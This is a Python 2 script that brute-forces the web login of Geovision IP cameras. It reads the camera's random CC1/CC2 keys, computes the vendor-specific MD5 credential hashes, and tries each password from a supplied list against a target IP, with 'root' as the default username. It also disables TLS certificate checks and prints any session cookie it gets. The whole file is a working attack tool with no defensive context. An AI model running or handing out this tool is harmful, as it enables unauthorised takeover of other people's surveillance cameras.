import argparse
import base64
import hashlib
import json
import json
import os
import random
import re
import select
import socket
import ssl
import string
import sys
import urllib

import commentjson
import httplib
import urllib2
import xmltodict


def split2len(s, n):
    def _f(s, n):
        while s:
            yield s[:n]
            s = s[n:]

    return list(_f(s, n))


class NoRedirection(urllib2.HTTPErrorProcessor):

    def http_response(self, request, response):
        return response

    https_response = http_response


class HTTPconnect:

    def __init__(self, host, proto, verbose, credentials, Raw, noexploit):
        self.host = host
        self.proto = proto
        self.verbose = verbose
        self.credentials = credentials
        self.Raw = Raw
        self.noexploit = False
        self.noexploit = noexploit

    def Send(self, uri, query_headers, query_data, ID):
        self.uri = uri
        self.query_headers = query_headers
        self.query_data = query_data
        self.ID = ID

        # Connect-timeout in seconds
        timeout = 10
        socket.setdefaulttimeout(timeout)

        url = '{}://{}{}'.format(self.proto, self.host, self.uri)

        if self.verbose:
            print("[Verbose] Sending:", url)

        if self.proto == 'https':
            if hasattr(ssl, '_create_unverified_context'):
                print("[i] Creating SSL Unverified Context")
                ssl._create_default_https_context = ssl._create_unverified_context

        if self.credentials:

            Basic_Auth = self.credentials.split(':')

            if self.verbose:
                print("[Verbose] User:", Basic_Auth[0], "password:", Basic_Auth[1])

            try:

                pwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()
                pwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])
                auth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)

                if True:
                    http_logger = urllib2.HTTPHandler(debuglevel=1)  # HTTPSHandler... for HTTPS
                    opener = urllib2.build_opener(auth_handler, NoRedirection, http_logger)
                else:
                    opener = urllib2.build_opener(auth_handler, NoRedirection)

                urllib2.install_opener(opener)

            except Exception as e:
                print("[!] Basic Auth Error:", e)
                return

        else:
            http_logger = urllib2.HTTPHandler(debuglevel=1)
            opener = urllib2.build_opener(http_logger, NoRedirection)
            urllib2.install_opener(opener)

        if self.noexploit and not self.verbose:
            print("[<] 204 Not Sending!")
            html = "Not sending any data"
            return html
        else:
            if self.query_data:
                req = urllib2.Request(url, data=urllib.urlencode(self.query_data, doseq=True),
                                      headers=self.query_headers)
                if self.ID:
                    Cookie = 'CLIENT_ID={}'.format(self.ID)
                    req.add_header('Cookie', Cookie)
            else:
                req = urllib2.Request(url, None, headers=self.query_headers)
                if self.ID:
                    Cookie = 'CLIENT_ID={}'.format(self.ID)
                    req.add_header('Cookie', Cookie)
            rsp = urllib2.urlopen(req)
            if rsp:
                print("[<] {}".format(rsp.code))

        if self.Raw:
            return rsp
        else:
            html = rsp.read()
            return html


class Geovision:

    def __init__(self, rhost, proto, verbose, credentials, raw_request, noexploit, headers, SessionID):
        self.rhost = rhost
        self.proto = proto
        self.verbose = verbose
        self.credentials = credentials
        self.raw_request = raw_request
        self.noexploit = noexploit
        self.headers = headers
        self.SessionID = SessionID

    def Login(self, username, password):

        try:

            print("[>] Requesting keys from remote")

            URI = '/ssi.cgi/Login.htm'
            response = HTTPconnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw_request,
                                   self.noexploit).Send(URI, self.headers, None, None)
            response = response.read()[:1500]
            response = re.split('[()<>?"\n_&;/ ]', response)

        except Exception as e:
            print("[!] Can't access remote host... ({})".format(e))
            sys.exit(1)

        try:
            #
            # Geovision way to have MD5 random Login and Password
            #
            CC1 = ''
            CC2 = ''
            for check in range(0, len(response)):

                if response[check] == 'cc1=':
                    CC1 = response[check + 1]
                    print("[i] Random key CC1: {}".format(response[check + 1]))

                elif response[check] == 'cc2=':
                    CC2 = response[check + 1]
                    print("[i] Random key CC2: {}".format(response[check + 1]))


            if not CC1 and not CC2:
                print("[!] CC1 and CC2 missing!")
                print("[!] Cannot generate MD5, exiting..")
                sys.exit(0)

            #
            # Geovision MD5 Format
            #
            uMD5 = hashlib.md5(CC1 + username + CC2).hexdigest().upper()
            pMD5 = hashlib.md5(CC2 + password + CC1).hexdigest().upper()

            self.query_args = {
                "username": "",
                "password": "",
                "Apply": "Apply",
                "umd5": uMD5,
                "pmd5": pMD5,
                "browser": 1,
                "is_check_OCX_OK": 0
            }

            print("[>] Logging in")
            URI = '/LoginPC.cgi'
            response = HTTPconnect(self.rhost, self.proto, self.verbose, self.credentials, self.raw_request,
                                   self.noexploit).Send(URI, self.headers, self.query_args, self.SessionID)

            # if we don't get 'Set-Cookie' back from the server, the Login has failed
            if not (response.info().get('Set-Cookie')):
                print("[!] Login Failed!")
                return
            if True:
                print("Cookie: {}".format(response.info().get('Set-Cookie')))

            return response.info().get('Set-Cookie')

        except Exception as e:
            print("[i] What happen? ({})".format(e))
            exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='IP Address of the Geovision Camera', required=True)
    parser.add_argument('--password_list', help='Password List to try against Geovision Camera', required=True)
    parser.add_argument('--username', help="username to try against Geovision Camera", default="root")
    args = parser.parse_args()

    headers = {
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'User-Agent': 'Mozilla'
    }

    raw_request = True
    no_exploit = True

    with open(args.password_list) as f:
        lines = f.readlines()

        for line in lines:
            SessionID = str(int(random.random() * 100000))
            camera = Geovision(args.ip, 'http', True, '%s:%s' % (args.username, line), raw_request, no_exploit, headers,
                               SessionID)
            camera.Login(args.username, line.rstrip())


if __name__ == '__main__':
    main()
